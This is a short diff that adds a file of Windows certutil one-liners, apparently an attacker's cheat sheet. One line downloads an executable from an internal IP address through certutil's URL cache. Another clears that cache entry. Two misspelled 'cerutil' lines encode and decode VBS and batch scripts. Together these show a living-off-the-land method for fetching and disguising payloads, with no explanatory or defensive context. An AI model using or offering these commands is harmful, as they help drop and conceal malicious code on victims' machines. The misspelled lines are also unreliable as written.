@@ -1,0 +1,6 @@
+certutil.exe -urlcache -split -f http://192.168.1.115/fuck.exe
+certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete
+
+
+cerutil.exe -encode c:\download.vbs downaod.bat
+cerutil.exe -decode c:\download.bat c:\1.txt
